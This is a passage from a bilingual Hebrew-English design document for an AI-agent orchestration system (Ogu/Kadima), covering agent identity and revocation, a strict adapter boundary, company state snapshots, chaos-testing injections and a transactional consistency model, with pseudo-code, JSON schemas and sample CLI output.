      "mechanism": "New key derived from SHA256(current_key + rotation_count + orgHash)",
      "gracePeriodMs": 300000,
      "description": "Old key valid for 5 min after rotation to handle in-flight requests"
    },
    "localMode": {
      "description": "Local agents skip auth — identity verified by file-system access to .ogu/",
      "verification": "Agent can read .ogu/agents/{roleId}.state.json"
    }
  }
}
```

**Pseudo-code: agent-identity.mjs**

```javascript
// tools/ogu/commands/lib/agent-identity.mjs

import { createHash, createHmac, randomBytes } from 'crypto';
import { loadOrgSpec } from './agent-registry.mjs';

const SESSIONS_DIR = '.ogu/sessions';
const REVOKED_DIR = '.ogu/revoked';
const QUARANTINE_DIR = '.ogu/quarantine';

/**
 * Create a new agent identity bound to a role
 */
export function createIdentity(root, roleId) {
  const orgSpec = loadOrgSpec(root);
  const role = orgSpec.roles.find(r => r.roleId === roleId);
  if (!role) throw new Error(`OGU3901: Role '${roleId}' not found in OrgSpec`);

  const orgId = hashShort(orgSpec.org.name + orgSpec.org.version);
  const instanceId = hashShort(roleId + Date.now() + randomBytes(8).toString('hex'));
  const agentId = `${orgId}:${roleId}:${instanceId}`;

  const credential = {
    agentId,
    roleId,
    boundTo: {
      orgVersion: orgSpec.org.version,
      orgHash: hashFull(JSON.stringify(orgSpec.org)),
      roleHash: hashFull(JSON.stringify(role))
    },
    issued: new Date().toISOString(),
    expires: null, // local agents don't expire by default
    session: null, // created when task is assigned
    capabilities: role.capabilities || [],
    permissions: {
      tools: role.allowedTools,
      commands: role.allowedCommands,
      paths: role.ownershipScope,
      secrets: role.allowedSecrets || []
    },
    signature: null // set below
  };

  credential.signature = sign(credential, root);

  writeJsonSync(join(root, SESSIONS_DIR, `${agentId}.json`), credential);

  audit.emit(root, {
    type: 'agent_identity_created',
    agentId,
    context: { roleId, orgVersion: orgSpec.org.version }
  });

  return credential;
}

/**
 * Bind agent to a session (task assignment)
 */
export function startSession(root, agentId, { taskId, featureSlug }) {
  const credential = loadCredential(root, agentId);
  if (!credential) throw new Error(`OGU3902: Agent '${agentId}' not found`);

  // Check if revoked
  if (isRevoked(root, agentId)) {
    throw new Error(`OGU3903: Agent '${agentId}' has been revoked`);
  }

  // Check if expired
  if (credential.expires && new Date(credential.expires) < new Date()) {
    throw new Error(`OGU3904: Agent '${agentId}' session expired`);
  }

  // Check if role still valid in OrgSpec
  const orgSpec = loadOrgSpec(root);
  const currentRoleHash = hashFull(JSON.stringify(orgSpec.roles.find(r => r.roleId === credential.roleId)));
  if (currentRoleHash !== credential.boundTo.roleHash) {
    throw new Error(`OGU3905: Role '${credential.roleId}' has changed since agent was created. Re-create identity.`);
  }

  credential.session = {
    sessionId: randomBytes(16).toString('hex'),
    startedAt: new Date().toISOString(),
    taskId,
    featureSlug,
    state: 'active'
  };

  saveCredential(root, agentId, credential);

  audit.emit(root, {
    type: 'agent_session_started',
    agentId,
    context: { sessionId: credential.session.sessionId, taskId, featureSlug }
  });

  return credential.session;
}

/**
 * Revoke agent identity
 */
export function revokeAgent(root, agentId, { reason, revokedBy }) {
  const credential = loadCredential(root, agentId);
  if (!credential) throw new Error(`OGU3906: Agent '${agentId}' not found`);

  const revocation = {
    agentId,
    revokedAt: new Date().toISOString(),
    reason,
    revokedBy,
    quarantinedOutputs: []
  };

  // If agent has active session, quarantine outputs since last checkpoint
  if (credential.session?.state === 'active') {
    const outputs = findOutputsSinceLastCheckpoint(root, agentId);
    revocation.quarantinedOutputs = quarantineOutputs(root, agentId, outputs);
  }

  writeJsonSync(join(root, REVOKED_DIR, `${agentId}.json`), revocation);

  // Release all resources
  releaseAllAgentResources(root, agentId);

  audit.emit(root, {
    type: 'agent_revoked',
    agentId,
    context: { reason, revokedBy, quarantined: revocation.quarantinedOutputs.length }
  });

  return revocation;
}

/**
 * Verify agent credential (for remote runners)
 */
export function verifyCredential(root, agentId, signature) {
  const credential = loadCredential(root, agentId);
  if (!credential) return { valid: false, error: 'Agent not found' };
  if (isRevoked(root, agentId)) return { valid: false, error: 'Agent revoked' };

  const expectedSig = sign(credential, root);
  if (signature !== expectedSig) return { valid: false, error: 'Signature mismatch' };

  return { valid: true, credential };
}

/**
 * Check session liveness — called by Kadima
 */
export function checkSessionHealth(root, agentId) {
  const credential = loadCredential(root, agentId);
  if (!credential?.session) return { alive: false };

  const session = credential.session;
  const now = Date.now();
  const started = new Date(session.startedAt).getTime();
  const idle = session.lastActivityAt
    ? now - new Date(session.lastActivityAt).getTime()
    : now - started;

  // Check idle timeout
  if (session.state === 'idle' && idle > 3600000) {
    expireSession(root, agentId);
    return { alive: false, reason: 'idle_timeout' };
  }

  // Check max duration
  if (now - started > 86400000) {
    expireSession(root, agentId);
    return { alive: false, reason: 'max_duration' };
  }

  return { alive: true, state: session.state, idleMs: idle };
}

function hashShort(input) {
  return createHash('sha256').update(input).digest('hex').slice(0, 8);
}

function hashFull(input) {
  return 'sha256:' + createHash('sha256').update(input).digest('hex').slice(0, 16);
}

function sign(credential, root) {
  const secret = loadOrgSecret(root);
  const payload = credential.agentId + credential.roleId + credential.boundTo.orgHash + (credential.session?.sessionId || '');
  return createHmac('sha256', secret).update(payload).digest('hex');
}
```

**CLI Commands:**

```
ogu agent:identity <roleId>                    ← Create new agent identity
ogu agent:identity --show <agentId>            ← Show agent credential
ogu agent:revoke <agentId> --reason "..."      ← Revoke agent
ogu agent:sessions                             ← List all active sessions
ogu agent:sessions --expired                   ← Show expired/revoked sessions
ogu agent:quarantine                           ← List quarantined outputs
ogu agent:verify <agentId>                     ← Verify agent credential integrity
```

**Example:**
```
$ ogu agent:identity architect
✓ Created agent identity
  AgentId:    myapp:architect:f3a8b2c1
  Role:       architect
  OrgVersion: 1.0.0
  Capabilities: architect_review, code_generation
  Permissions: 12 tools, 5 commands, 4 path patterns
  Signature:  a1b2c3d4e5f6...

$ ogu agent:sessions
ACTIVE SESSIONS:
  myapp:architect:f3a8b2c1  │ active  │ task-5 (auth-system) │ 2h 15m
  myapp:backend:e4d5c6b7    │ active  │ task-6 (auth-system) │ 1h 30m
  myapp:qa:c8d9e0f1         │ idle    │ — (45m idle)         │ timeout in 15m

REVOKED (last 7 days):
  myapp:frontend:a1b2c3d4   │ 2026-02-27 │ budget_exhausted │ 3 files quarantined
```

**כלל ברזל:** כל agent פועל עם AgentId פורמלי. Session = binding ל-task + feature. Role change = re-create identity. Revocation = immediate halt + quarantine. Remote = HMAC auth + key rotation.

---

### Enhancement 1: KadimaAdapter.contract — Strict Boundary Enforcement

**הבעיה:** Fix 1 הגדיר InputEnvelope/OutputEnvelope, אבל הגבול בין Kadima ל-Ogu עדיין enforced by convention. צריך adapter שמאלץ כל תקשורת לעבור דרך הממשק הפורמלי.

**קובץ חדש:** `docs/vault/02_Contracts/KadimaAdapter.contract.md`

**Schema: KadimaAdapter**

```json
{
  "$schema": "KadimaAdapter/1.0",

  "contract": {
    "description": "ALL communication between Kadima and Ogu MUST pass through this adapter. No direct function calls.",
    "enforcement": "static_analysis + runtime_check"
  },

  "inbound": {
    "description": "Kadima → Ogu: only via InputEnvelope",
    "method": "kadimaAdapter.dispatch(inputEnvelope)",
    "validation": [
      "InputEnvelope schema valid",
      "agentId is active and not revoked",
      "featureSlug has valid envelope",
      "task exists in Plan.json",
      "policy evaluated and not blocked"
    ],
    "rejectionCodes": {
      "OGU4001": "Invalid InputEnvelope schema",
      "OGU4002": "Agent identity invalid or revoked",
      "OGU4003": "Feature envelope check failed",
      "OGU4004": "Task not found in plan",
      "OGU4005": "Policy blocked this action"
    }
  },

  "outbound": {
    "description": "Ogu → Kadima: only via OutputEnvelope or ErrorEnvelope",
    "method": "return OutputEnvelope | ErrorEnvelope",
    "validation": [
      "OutputEnvelope schema valid",
      "All declared outputs exist",
      "Cost recorded",
      "Snapshot captured"
    ]
  },

  "forbidden": [
    "Kadima importing any function from tools/ogu/commands/*.mjs directly",
    "Ogu importing any function from tools/kadima/*.mjs directly",
    "Kadima reading .ogu/agents/ directly (use agent-registry API)",
    "Ogu reading OrgSpec directly (receive via InputEnvelope.context)",
    "Any module bypassing the adapter"
  ]
}
```

**Pseudo-code: kadima-adapter.mjs**

```javascript
// tools/ogu/commands/lib/kadima-adapter.mjs

import { validateInputEnvelope, validateOutputEnvelope } from './envelope-validator.mjs';
import { verifyCredential } from './agent-identity.mjs';
import { checkEnvelope } from './feature-isolation.mjs';
import { evaluate as policyEvaluate } from './policy-engine.mjs';
import { audit } from './audit.mjs';

/**
 * THE ONLY WAY Kadima can talk to Ogu.
 * Every dispatch goes through validation pipeline.
 */
export function dispatch(root, inputEnvelope) {
  // Step 1: Schema validation
  const schemaResult = validateInputEnvelope(inputEnvelope);
  if (!schemaResult.valid) {
    return errorEnvelope('OGU4001', `Invalid InputEnvelope: ${schemaResult.errors.join(', ')}`);
  }

  // Step 2: Agent identity check
  const identityResult = verifyCredential(root, inputEnvelope.agentId, inputEnvelope.agentSignature);
  if (!identityResult.valid) {
    return errorEnvelope('OGU4002', `Agent identity invalid: ${identityResult.error}`);
  }

  // Step 3: Feature envelope check
  const envelopeResult = checkEnvelope(root, inputEnvelope.featureSlug, {
    taskCost: inputEnvelope.estimatedCost,
    resourceType: inputEnvelope.resourceType || 'model_call',
    filesTouch: inputEnvelope.expectedOutputs?.map(o => o.path) || []
  });
  if (!envelopeResult.allowed) {
    return errorEnvelope('OGU4003', envelopeResult.violations.map(v => v.error).join('; '));
  }

  // Step 4: Policy evaluation
  const policyResult = policyEvaluate(root, buildPolicyContext(root, inputEnvelope));
  if (policyResult.effects._blocked) {
    return errorEnvelope('OGU4005', `Policy blocked: ${policyResult.resolutionLog.map(r => r.group).join(', ')}`);
  }

  // Step 5: Audit the dispatch
  audit.emit(root, {
    type: 'kadima_dispatch',
    agentId: inputEnvelope.agentId,
    context: {
      taskId: inputEnvelope.taskId,
      featureSlug: inputEnvelope.featureSlug,
      policyResult: policyResult.matchedRules
    }
  });

  // Step 6: Route to Ogu execution
  return { accepted: true, policyEffects: policyResult.effects, envelope: inputEnvelope };
}

/**
 * THE ONLY WAY Ogu can respond to Kadima.
 */
export function respond(root, outputEnvelope) {
  const schemaResult = validateOutputEnvelope(outputEnvelope);
  if (!schemaResult.valid) {
    audit.emit(root, {
      type: 'invalid_output_envelope',
      context: { errors: schemaResult.errors }
    });
    throw new Error(`OGU4006: Invalid OutputEnvelope: ${schemaResult.errors.join(', ')}`);
  }

  // Record cost
  if (outputEnvelope.cost) {
    recordSpend(root, outputEnvelope.featureSlug, outputEnvelope.cost.totalCost);
  }

  audit.emit(root, {
    type: 'ogu_response',
    context: {
      taskId: outputEnvelope.taskId,
      status: outputEnvelope.status,
      cost: outputEnvelope.cost?.totalCost
    }
  });

  return outputEnvelope;
}

function errorEnvelope(code, message) {
  return {
    accepted: false,
    error: { code, message, timestamp: new Date().toISOString() }
  };
}
```

**Static Analysis Rule (enforced by `ogu validate`):**

```javascript
// Validation rule: no direct cross-boundary imports

const BOUNDARY_RULES = [
  {
    check: 'kadima_imports_ogu',
    pattern: /from ['"].*tools\/ogu\/commands\//,
    inFiles: 'tools/kadima/**/*.mjs',
    allowed: ['kadima-adapter.mjs'],
    error: 'OGU4010: Kadima module imports Ogu directly. Use kadima-adapter.dispatch() instead.'
  },
  {
    check: 'ogu_imports_kadima',
    pattern: /from ['"].*tools\/kadima\//,
    inFiles: 'tools/ogu/**/*.mjs',
    allowed: [],
    error: 'OGU4011: Ogu module imports Kadima directly. Return OutputEnvelope instead.'
  }
];
```

**כלל ברזל:** Kadima calls `dispatch()`. Ogu returns `respond()`. שום import ישיר. Static analysis מוודא בכל `ogu validate`.

---

### Enhancement 2: Company Snapshot — Full Org Replay

**הבעיה:** Execution Snapshot (Fix 3) תופס snapshot של ביצוע בודד. אבל אין snapshot של כל החברה — כל ה-state כולו — שמאפשר replay של ארגון שלם.

**Schema: CompanySnapshot**

```json
{
  "$schema": "CompanySnapshot/1.0",
  "snapshotId": "company-snap-20260228-143000",
  "capturedAt": "2026-02-28T14:30:00Z",
  "capturedBy": "system",

  "orgSpec": {
    "hash": "sha256:abc123...",
    "version": "1.0.0",
    "roles": 10,
    "teams": 3
  },

  "policyState": {
    "version": 7,
    "rulesHash": "sha256:def456...",
    "astHash": "sha256:ghi789...",
    "activeRules": 12
  },

  "capabilityMatrix": {
    "hash": "sha256:jkl012...",
    "capabilities": 8,
    "models": 5,
    "activeCanaries": 1
  },

  "budgetState": {
    "totalSpent": 245.80,
    "totalBudget": 1000.00,
    "perFeature": {
      "auth-system": { "spent": 12.30, "max": 50.00 },
      "dashboard-v2": { "spent": 45.00, "max": 100.00 }
    }
  },

  "featurePortfolio": [
    {
      "slug": "auth-system",
      "state": "building",
      "statesSince": "2026-02-27T14:00:00Z",
      "tasksTotal": 15,
      "tasksComplete": 8,
      "activeSessions": 2,
      "envelopeHealth": "ok"
    },
    {
      "slug": "dashboard-v2",
      "state": "reviewing",
      "tasksTotal": 22,
      "tasksComplete": 22,
      "activeSessions": 0,
      "envelopeHealth": "ok"
    }
  ],

  "activeSessions": [
    {
      "agentId": "myapp:architect:f3a8b2c1",
      "roleId": "architect",
      "taskId": "task-5",
      "featureSlug": "auth-system",
      "state": "active",
      "duration": "2h 15m"
    }
  ],

  "resourceUsage": {
    "model_call": { "used": 2, "max": 3 },
    "build": { "used": 0, "max": 1 },
    "worktree": { "used": 2, "max": 5 }
  },

  "auditStats": {
    "totalEvents": 1847,
    "last24h": 234,
    "lastError": null
  },

  "hashes": {
    "orgSpecHash": "sha256:...",
    "stateHash": "sha256:...",
    "budgetHash": "sha256:...",
    "policyHash": "sha256:...",
    "portfolioHash": "sha256:...",
    "fullSnapshotHash": "sha256:composite_of_all_above"
  }
}
```

**Pseudo-code: company-snapshot.mjs**

```javascript
// tools/ogu/commands/lib/company-snapshot.mjs

import { loadOrgSpec } from './agent-registry.mjs';
import { loadPolicyVersion } from './policy-ast.mjs';
import { loadAllEnvelopes } from './feature-isolation.mjs';
import { resourceStatus } from './resource-governor.mjs';
import { createHash } from 'crypto';

const SNAPSHOTS_DIR = '.ogu/company-snapshots';

/**
 * Capture full company state
 */
export function captureCompanySnapshot(root) {
  const snapshot = {
    $schema: 'CompanySnapshot/1.0',
    snapshotId: `company-snap-${formatTimestamp()}`,
    capturedAt: new Date().toISOString(),
    capturedBy: 'system',

    orgSpec: captureOrgState(root),
    policyState: capturePolicyState(root),
    capabilityMatrix: captureCapabilityState(root),
    budgetState: captureBudgetState(root),
    featurePortfolio: capturePortfolio(root),
    activeSessions: captureActiveSessions(root),
    resourceUsage: captureResourceState(root),
    auditStats: captureAuditStats(root),
    hashes: {}
  };

  // Compute composite hash
  snapshot.hashes = computeHashes(snapshot);

  writeJsonSync(join(root, SNAPSHOTS_DIR, `${snapshot.snapshotId}.json`), snapshot);

  audit.emit(root, {
    type: 'company_snapshot',
    context: { snapshotId: snapshot.snapshotId, hash: snapshot.hashes.fullSnapshotHash }
  });

  return snapshot;
}

/**
 * Compare two company snapshots
 */
export function diffSnapshots(root, snapshotA, snapshotB) {
  const a = loadSnapshot(root, snapshotA);
  const b = loadSnapshot(root, snapshotB);

  return {
    orgChanged: a.orgSpec.hash !== b.orgSpec.hash,
    policyChanged: a.policyState.rulesHash !== b.policyState.rulesHash,
    budgetDelta: {
      spent: b.budgetState.totalSpent - a.budgetState.totalSpent,
      period: `${a.capturedAt} → ${b.capturedAt}`
    },
    featureChanges: diffPortfolio(a.featurePortfolio, b.featurePortfolio),
    sessionChanges: diffSessions(a.activeSessions, b.activeSessions)
  };
}

/**
 * Replay company from snapshot (restore state)
 */
export function restoreFromSnapshot(root, snapshotId, { dryRun = true } = {}) {
  const snapshot = loadSnapshot(root, snapshotId);

  if (dryRun) {
    return {
      wouldRestore: {
        orgSpec: snapshot.orgSpec.version,
        policyVersion: snapshot.policyState.version,
        features: snapshot.featurePortfolio.length,
        budget: snapshot.budgetState
      },
      warning: 'This will overwrite current state. Use --execute to apply.'
    };
  }

  // Actual restore (dangerous — audit heavily)
  audit.emit(root, {
    type: 'company_restore_started',
    context: { snapshotId, currentHash: captureCompanySnapshot(root).hashes.fullSnapshotHash }
  });

  // Restore each component...
  restoreOrgSpec(root, snapshot.orgSpec);
  restorePolicyState(root, snapshot.policyState);
  restoreBudgetState(root, snapshot.budgetState);
  // Feature portfolio state is derived — features self-recover from their own STATE.json

  audit.emit(root, {
    type: 'company_restore_complete',
    context: { snapshotId, restoredHash: snapshot.hashes.fullSnapshotHash }
  });
}
```

**CLI Commands:**

```
ogu company:snapshot                           ← Capture full company state
ogu company:snapshot --diff <id1> <id2>        ← Compare two snapshots
ogu company:snapshot --list                    ← List all snapshots
ogu company:snapshot --restore <id> --dry-run  ← Preview restore
ogu company:snapshot --restore <id> --execute  ← Restore from snapshot (requires CTO approval)
ogu company:status                             ← Live company dashboard
```

**Example:**
```
$ ogu company:status
COMPANY: My App (v1.0.0)                    2026-02-28 14:30

  ORG:     10 roles, 3 teams, policy v7
  BUDGET:  $245.80 / $1,000.00 (24.6%) ████░░░░░░░░░░░░
  AGENTS:  3 active, 2 idle, 0 revoked

  FEATURES:
    auth-system     │ building  │ 8/15 tasks │ $12.30  │ 2 agents
    dashboard-v2    │ reviewing │ 22/22 tasks│ $45.00  │ compile running
    onboarding-flow │ specced   │ 0/0 tasks  │ $0.00   │ awaiting architect

  RESOURCES:
    model_call  ██████████░░░░░ 2/3
    build       ░░░░░░░░░░░░░░░ 0/1
    worktree    ████████░░░░░░░ 2/5

  LAST SNAPSHOT: company-snap-20260228-140000 (30m ago)
  LAST AUDIT EVENT: agent_task_complete (2m ago)
```

**כלל ברזל:** Company Snapshot = hash של כל ה-state. ניתן להשוות, ל-diff, ול-restore. Restore requires CTO approval + full audit.

---

### Enhancement 3: Failure Simulation Mode — Chaos Injection

**הבעיה:** OS תשתיתי צריך יכולת בדיקת עמידות. בלי chaos testing, אתה לא יודע אם failure containment עובד, אם budget isolation עובד, אם agent revocation עובד.

**קבצים חדשים:**

```
tools/ogu/commands/chaos.mjs                   ← CLI: chaos:inject, chaos:plan, chaos:report
tools/ogu/commands/lib/chaos-engine.mjs        ← Chaos injection engine
.ogu/chaos/                                    ← Chaos test plans and results
```

**Schema: ChaosTestPlan**

```json
{
  "$schema": "ChaosTest/1.0",
  "planId": "chaos-20260228-001",
  "description": "Test failure containment for auth-system",
  "targetFeature": "auth-system",
  "injections": [
    {
      "id": "inj-1",
      "type": "agent_failure",
      "params": {
        "agentId": "myapp:backend:a1b2c3d4",
        "failureMode": "crash",
        "afterTask": 3
      },
      "expected": {
        "containment": "feature_suspended_or_escalated",
        "otherFeaturesAffected": false,
        "resourcesReleased": true
      }
    },
    {
      "id": "inj-2",
      "type": "budget_exhaustion",
      "params": {
        "featureSlug": "auth-system",
        "simulatedSpend": 49.50
      },
      "expected": {
        "alertsFired": ["notify_pm", "notify_cto"],
        "executionBlocked": true,
        "otherFeaturesAffected": false
      }
    },
    {
      "id": "inj-3",
      "type": "policy_conflict",
      "params": {
        "injectRule": {
          "id": "chaos-conflicting-rule",
          "when": { "operator": "AND", "conditions": [{ "field": "task.riskTier", "op": "eq", "value": "low" }] },
          "then": [{ "effect": "blockExecution", "params": {} }],
          "priority": 999
        }
      },
      "expected": {
        "conflictDetected": true,
        "resolutionLogged": true,
        "blockingEffectApplied": true
      }
    },
    {
      "id": "inj-4",
      "type": "blast_radius_violation",
      "params": {
        "agentId": "myapp:backend:a1b2c3d4",
        "fileAttempt": "src/database/migrations/001.sql"
      },
      "expected": {
        "blocked": true,
        "errorCode": "OGU3804",
        "agentNotRevoked": true
      }
    },
    {
      "id": "inj-5",
      "type": "model_unavailable",
      "params": {
        "provider": "anthropic",
        "model": "opus",
        "duration": "simulated"
      },
      "expected": {
        "fallbackTriggered": true,
        "degradedCapability": true,
        "auditLogged": true
      }
    },
    {
      "id": "inj-6",
      "type": "concurrent_overload",
      "params": {
        "simultaneousTasks": 10,
        "targetResource": "model_call"
      },
      "expected": {
        "queueingActivated": true,
        "maxConcurrencyRespected": true,
        "noOOMOrCrash": true
      }
    }
  ]
}
```

**Pseudo-code: chaos-engine.mjs**

```javascript
// tools/ogu/commands/lib/chaos-engine.mjs

import { audit } from './audit.mjs';

const CHAOS_DIR = '.ogu/chaos';

/**
 * Available injection types
 */
const INJECTORS = {
  agent_failure: injectAgentFailure,
  budget_exhaustion: injectBudgetExhaustion,
  policy_conflict: injectPolicyConflict,
  blast_radius_violation: injectBlastRadiusViolation,
  model_unavailable: injectModelUnavailable,
  concurrent_overload: injectConcurrentOverload,
  secret_leak_attempt: injectSecretLeakAttempt,
  session_expiry: injectSessionExpiry
};

/**
 * Run a chaos test plan
 */
export async function runChaosPlan(root, planId) {
  const plan = loadChaosPlan(root, planId);
  const results = [];

  audit.emit(root, {
    type: 'chaos_test_started',
    context: { planId, injections: plan.injections.length }
  });

  for (const injection of plan.injections) {
    const injector = INJECTORS[injection.type];
    if (!injector) {
      results.push({ id: injection.id, status: 'skipped', reason: `Unknown type: ${injection.type}` });
      continue;
    }

    // Snapshot state BEFORE injection
    const stateBefore = captureSystemState(root);

    // Inject fault
    const faultResult = await injector(root, injection.params);

    // Wait for system to react
    await waitForStabilization(root, { maxWaitMs: 30000 });

    // Snapshot state AFTER
    const stateAfter = captureSystemState(root);

    // Verify expectations
    const verification = verifyExpectations(injection.expected, {
      before: stateBefore,
      after: stateAfter,
      faultResult
    });

    results.push({
      id: injection.id,
      type: injection.type,
      status: verification.allPassed ? 'passed' : 'failed',
      expectations: verification.details,
      stateDelta: diffSystemState(stateBefore, stateAfter)
    });

    // CRITICAL: Clean up injection — chaos tests must not leave permanent damage
    await cleanupInjection(root, injection, faultResult);
  }

  // Save report
  const report = {
    planId,
    completedAt: new Date().toISOString(),
    results,
    summary: {
      total: results.length,
      passed: results.filter(r => r.status === 'passed').length,
      failed: results.filter(r => r.status === 'failed').length,
      skipped: results.filter(r => r.status === 'skipped').length
    }
  };

  writeJsonSync(join(root, CHAOS_DIR, `${planId}-report.json`), report);

  audit.emit(root, {
    type: 'chaos_test_complete',
    context: { planId, ...report.summary }
  });

  return report;
}

/**
 * Individual injectors
 */
async function injectAgentFailure(root, { agentId, failureMode, afterTask }) {
  // Simulate agent crash/hang/error after N tasks
  const mock = {
    type: 'agent_failure',
    agentId,
    injectedAt: new Date().toISOString(),
    failureMode // crash | hang | error | oom
  };

  // Trigger the failure handling path
  if (failureMode === 'crash') {
    revokeAgent(root, agentId, { reason: 'chaos_test:crash', revokedBy: 'chaos-engine' });
  }

  return mock;
}

async function injectBudgetExhaustion(root, { featureSlug, simulatedSpend }) {
  const envelope = loadEnvelope(root, featureSlug);
  const originalSpent = envelope.budget.spent;

  // Temporarily inflate spend
  envelope.budget.spent = simulatedSpend;
  saveEnvelope(root, featureSlug, envelope);

  return { originalSpent, simulatedSpend, featureSlug };
}

async function injectBlastRadiusViolation(root, { agentId, fileAttempt }) {
  // Attempt to "touch" a file outside blast radius
  const result = checkEnvelope(root, getAgentFeature(root, agentId), {
    taskCost: 0,
    resourceType: 'model_call',
    filesTouch: [fileAttempt]
  });

  return { fileAttempt, blocked: !result.allowed, violations: result.violations };
}

// ... other injectors follow same pattern
```

**CLI Commands:**

```
ogu chaos:plan <feature>                       ← Generate chaos test plan for feature
ogu chaos:inject --type <type> --feature <slug> [--params <json>]  ← Single injection
ogu chaos:run <planId>                         ← Run full chaos test plan
ogu chaos:report <planId>                      ← Show chaos test results
ogu chaos:list                                 ← List all chaos plans and results
```

**Example:**
```
$ ogu chaos:inject --type agent_failure --feature auth-system --params '{"failureMode":"crash"}'
CHAOS INJECTION: agent_failure

  Target:  myapp:backend:a1b2c3d4 (auth-system)
  Mode:    crash
  Inject:  NOW

  RESULT:
    ✓ Agent revoked immediately
    ✓ Resources released (1 model_call slot, 1 worktree)
    ✓ Outputs quarantined (2 files since last checkpoint)
    ✓ Feature state: building → building (no auto-suspend, failures: 1/3)
    ✓ Other features unaffected
    ✓ Audit event logged

  CLEANUP:
    ✓ Agent identity restored
    ✓ Budget spend reversed
    ✓ Quarantine cleared

  VERDICT: PASS — failure contained within feature boundary

$ ogu chaos:run chaos-20260228-001
CHAOS TEST: chaos-20260228-001

  TARGET: auth-system
  INJECTIONS: 6

  inj-1  agent_failure          PASS  ✓ contained ✓ released ✓ quarantined
  inj-2  budget_exhaustion      PASS  ✓ alerts ✓ blocked ✓ isolated
  inj-3  policy_conflict        PASS  ✓ detected ✓ logged ✓ resolved
  inj-4  blast_radius_violation PASS  ✓ blocked OGU3804 ✓ agent not revoked
  inj-5  model_unavailable      PASS  ✓ fallback ✓ degraded ✓ audited
  inj-6  concurrent_overload    PASS  ✓ queued ✓ max respected ✓ no crash

  SUMMARY: 6/6 passed, 0 failed
  CONTAINMENT: verified — no cross-feature contamination
```

**כלל ברזל:** Chaos tests are first-class citizens, not afterthought. כל injection חייבת cleanup. Chaos test results = proof that isolation works. Run before every major release.

---

## Iteration 5: OS Guarantees — ל-13 מושלם

> ארבע closures אחרונות ושלוש הרחבות שהופכות את המערכת מ-"תשתית רצינית" ל-"OS עם guarantees".
> ההבדל בין 12.6 ל-13: לא עוד יכולות, אלא ערבויות פורמליות.
> Consistency. Scheduling. Resilience. Measurement.

```
Closure 5: Formal Consistency Model — transaction boundaries, commit order, rollback
Closure 6: Formal Scheduling Policy — fairness, starvation, preemption, weighted fair
Closure 7: Failure Domains & Resilience Strategy — circuit breakers, degraded mode, kill switch
Closure 8: Formal Metrics Layer — health scores, KPIs, SLAs, regression

Enhancement 4: Execution Graph Hash — DAG-level determinism proof
Enhancement 5: Deterministic Mode Flag — lockdown mode for formal verification
Enhancement 6: Company Freeze — audit-only mode
```

---

### Closure 5: Formal Consistency Model — Transaction Boundaries

**הבעיה:** המערכת מריצה פעולות שחוצות שכבות: Kadima → Ogu → Budget → Audit → Snapshot. אבל אין הגדרה של:
1. מה קורה אם Budget update נכשל אחרי ש-Audit נכתב?
2. מה ה-source of truth כש-state ב-allocation לא תואם state ב-budget?
3. מתי transaction "committed" ומתי "rolled back"?
4. איך מבטיחים idempotency אם retry מתרחש?

בלי consistency model, יש "eventual consistency by hope" — לא OS.

**קובץ חדש:** `docs/vault/02_Contracts/Consistency.contract.md`

**Schema: Source of Truth Hierarchy**

```json
{
  "$schema": "ConsistencyModel/1.0",

  "sourceOfTruth": {
    "description": "In case of conflict between layers, this hierarchy determines which layer wins.",
    "hierarchy": [
      {
        "rank": 1,
        "layer": "Audit Trail",
        "path": ".ogu/audit/",
        "property": "append-only, immutable",
        "rule": "If audit says it happened, it happened. Audit is never rolled back — only compensating events are appended."
      },
      {
        "rank": 2,
        "layer": "Feature State Machine",
        "path": "docs/vault/04_Features/{slug}/STATE.json",
        "property": "single-writer (state-machine-v2.mjs)",
        "rule": "Feature state is the authoritative lifecycle position. Other layers derive from it."
      },
      {
        "rank": 3,
        "layer": "Execution Snapshots",
        "path": ".ogu/snapshots/",
        "property": "immutable after capture",
        "rule": "Snapshots are evidence. They don't drive state — they prove it."
      },
      {
        "rank": 4,
        "layer": "Budget State",
        "path": ".ogu/budget.json + envelope.json",
        "property": "eventually consistent with audit",
        "rule": "Budget can be reconstructed from audit events. If budget state conflicts with audit, audit wins."
      },
      {
        "rank": 5,
        "layer": "Resource Governor",
        "path": ".ogu/locks/active.json",
        "property": "ephemeral, reconstructible",
        "rule": "Resource state is volatile. On crash, reconstruct from audit + feature states."
      },
      {
        "rank": 6,
        "layer": "Agent Sessions",
        "path": ".ogu/sessions/",
        "property": "ephemeral, time-bounded",
        "rule": "Sessions expire. On conflict, kill session and re-create."
      }
    ],
    "conflictResolution": "Higher rank wins. If rank 4 (Budget) says $12 spent but rank 1 (Audit) shows $15 in events, Budget is corrected to $15."
  },

  "atomicUnit": {
    "name": "TaskExecutionTransaction",
    "description": "The smallest unit of work that must fully succeed or fully roll back.",
    "scope": "One task, one agent, one model call, one set of outputs.",

    "phases": [
      {
        "phase": 1,
        "name": "prepare",
        "actions": [
          "Validate InputEnvelope",
          "Check feature envelope (budget + blast radius)",
          "Acquire resource slot",
          "Start agent session",
          "Capture pre-execution snapshot"
        ],
        "rollback": "Release resource slot, end session, log prepare_failed event",
        "idempotencyKey": "sha256(taskId + featureSlug + attempt)"
      },
      {
        "phase": 2,
        "name": "execute",
        "actions": [
          "Run agent task (model call + tool calls)",
          "Produce output artifacts"
        ],
        "rollback": "Quarantine outputs, log execute_failed event",
        "idempotencyKey": "sha256(taskId + inputHash + modelVersion)"
      },
      {
        "phase": 3,
        "name": "commit",
        "actions": [
          "STEP 1: Emit audit event (append-only, cannot fail meaningfully)",
          "STEP 2: Record budget spend (derive from audit if needed)",
          "STEP 3: Update allocation state (task complete/failed)",
          "STEP 4: Capture post-execution snapshot",
          "STEP 5: Release resource slot",
          "STEP 6: End agent session (or keep idle)"
        ],
        "commitOrder": "audit → budget → allocation → snapshot → resource → session",
        "failureHandling": {
          "audit_fails": "CRITICAL: Halt system. Audit is append-only file write — if this fails, filesystem is broken.",
          "budget_fails": "Mark budget as DIRTY. Next budget:reconcile will reconstruct from audit.",
          "allocation_fails": "Retry 3x. If still fails, mark task as ORPHANED in audit, escalate to Kadima.",
          "snapshot_fails": "Log warning. Snapshot is evidence, not state — execution is still valid.",
          "resource_fails": "Force-release on next poll cycle. Log stale_lock event.",
          "session_fails": "Session will auto-expire via TTL. No action needed."
        }
      }
    ]
  },

  "rollbackStrategy": {
    "type": "compensating_events",
    "description": "We NEVER delete audit entries. Rollback = append a compensating event.",
    "example": {
      "original": { "type": "budget_charged", "amount": 1.50, "taskId": "task-5" },
      "compensation": { "type": "budget_refund", "amount": 1.50, "taskId": "task-5", "reason": "task_execution_rolled_back" }
    },
    "rules": [
